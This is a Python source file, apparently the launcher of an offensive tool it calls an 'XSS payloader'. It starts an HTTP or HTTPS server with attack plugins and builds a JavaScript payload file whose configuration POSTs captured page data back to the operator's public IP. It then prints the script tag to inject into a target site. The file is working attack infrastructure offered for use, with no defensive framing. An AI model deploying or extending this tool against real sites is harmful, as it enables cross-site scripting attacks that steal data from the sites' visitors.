#!/usr/bin/python

import argparse, sys
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import builtins
import os

# Import and set logging
import logging
logging.basicConfig(level=logging.DEBUG)


# Self-developed modules
from plugins import *
import pyjs
from ctrl import Controller
from cfg import Cfg
import misc


# No SSL module is only a problem if user specify SSL
try:
	import ssl
except ImportError:
	logging.warning("Unable to import SSL module")
	ssl = None

# Used to make it easier to specify IP address, but not required
try:
	import netifaces
except ImportError:
	logging.warning("Unable to import netifaces module")
	netifaces = None




def main(port, plugins, use_https):
	servername = "Burger"
	if builtins.CFG.exist("global", "servername"):
		servername = builtins.CFG.get("global", "servername")
	requester = MyRequestHandler;
	requester.routes = plugins.get_routes()
	requester.server_version = servername
	requester.sys_version = ""
	try:
		httpd = HTTPServer( ('', port), requester)
		if use_https:
			pem = ""
			if builtins.CFG.exist("global", "certificate"):
				pem = builtins.CFG.get("global", "certificate")
			else:
				logging.fatal("To use SSL/TLS, you must specify a certificate")
				sys.exit(1)
			#httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
			httpd.socket = ssl.wrap_socket (httpd.socket, certfile=pem, server_side=True)
		logging.info("Server started")
		httpd.serve_forever();
	except:
		print 'Server shutting down', sys.exc_info()[0], " | ", sys.exc_info()[1]
		httpd.socket.close()


if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='XSS payloader')
	parser.add_argument('--list', '-l', type=str, default=argparse.SUPPRESS, help="List and exit", choices=['modules', 'jshelp'])
	parser.add_argument('--modules', '-m', type=str, help="Modules to load (default: all)", default="*")
	parser.add_argument('--js', '-j', type=str, help="JavaScript file to use")
	parser.add_argument('--ssl', '-s', action='store_true', default=False, help="Use SSL/TLS for HTTPS")
	parser.add_argument('--port', '-p', type=int, help="Which port to use", default="8080")
	args = vars(parser.parse_args())

	builtins.CFG = Cfg("config.cfg")
	
	plugs = Plugins();
	plugs.init_plugins();
	plugnames = plugs.get_plugin_names();
	plugload = []
	js_helpers = ["helpers/functions.js"]

	# Add all the helper JS code
	JS = pyjs.CreateJS()
	for jsh in js_helpers:
		jscode = misc.file2string(jsh)
		JS.add_functions(jscode)

	if "js" in args and args["js"] != None:
		JS.add_source_code(misc.file2string(args["js"]))

	if "list" in args:
		if args["list"] == "modules":
			print "Modules that can be loaded"
			for name in plugnames:
				print "\t" + name
		elif args["list"] == "jshelp":
			print "JavaScript helper function"
			funcs = JS.get_function_list()
			for func in funcs:
				print "\t" + func
		else:
			print "Unknown list type"
		sys.exit(0)

	# Get the basepath for the web server
	mybase = builtins.CFG.get("global", "basepath")
	if mybase == None:
		print "[ERROR] Basepath must be specified"
		sys.exit(1)

	# Ensure dir exist
	misc.create_dir(mybase)
	
	# Set IP that is used in JS code
	returnip = ""
	if builtins.CFG.exist("global", "publicip"):
		returnip = builtins.CFG.get("global", "publicip")
	else:
		returnip = misc.choose_return_ip()
		builtins.CFG.set("global", "publicip", returnip)
	
	use_https = False
	if args["ssl"] == True and ssl != None:
		use_https = True

	returnPath = "http"
	if use_https:
		returnPath += "s"
	returnPath += "://" + returnip
	if (use_https and args["port"] != 443) or (use_https == False and args["port"] != 80):
		returnPath += ":" + str(args["port"])
	
	jsvar = 'var returnPath = {};\nreturnPath["method"] = "POST";\nreturnPath["target"] = "' + returnPath
	jsvar += '";\nreturnPath["resource"] = "'
	jsvar += builtins.CFG.get("PageCatcher", "servbase")
	jsvar += '";'

	fdir = builtins.CFG.get("FileServer", "servpath")
	fspath = os.path.join(mybase, fdir)
	misc.create_dir(fspath)

	JS.add_global_sc(jsvar)
	

	funcs = JS.get_function_list()
	jscode = JS.generate_js(funcs)
	misc.string2file(jscode, os.path.join(fspath, "dl.js"))

	if args["modules"] == "*":
		plugload = plugnames
	else:
		plugload = args["modules"].split(",");
	
	for name in plugload:
		plugs.load_plugin(name, None)
	
	sdir = builtins.CFG.get("FileServer", "servbase")
	inc = "<script src='" + returnPath + sdir + "/dl.js'></script>"
	print "Include script with:\n\t" + inc

	
	with misc.cd(mybase):
		main(args["port"], plugs, use_https);


